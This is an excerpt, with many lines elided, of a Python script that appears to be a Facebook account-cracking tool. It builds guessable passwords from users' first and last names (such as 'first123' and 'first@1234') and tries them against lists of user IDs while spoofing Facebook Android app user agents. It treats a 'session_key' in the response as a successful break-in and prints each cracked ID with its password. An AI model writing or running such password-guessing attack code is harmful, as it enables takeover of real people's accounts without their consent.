...
def cloning_two():
    ...
    print(logo)
  #  print(50*'-')
    print(f" {W}[1] Auto Password")
    print(f" {W}[2] Choice Passwords")
    print(f" {W}[B] Back {W}")
    clon_ = input(" [?] Sellect : ")
    if clon_ == "1":
        pas = ["first last",'firstlast','first123','first@123','first@1234','first@12345','first1234','first','first12345','firstlast12345','firstlast1234','firstlast12345','firstlast@12345','firstlast@1234','firstlast@123','first786','first12','firstfirst','last']
        for px in pas:
            pp.append(px)
        pass
    elif clon_ == "2":
  ...
  #  print("To stop process press CTRL c")
    ...
    def rana(user):
        ...
        for px in pp:
          ...
          #  print (ua)
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [EAGLE-OK] {} {} {} {}'.format(G, url, fax, px, mys))
        ...
        #        print('\r{}\033[1;94m[2F-KING] {} {} {} {}'.format(G, url, fax, px, mys))
                ...
                #print(response.text)
                continue
        sys.stdout.write('\r {} [EAGLE] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ EAGLE ] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [EAGLE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
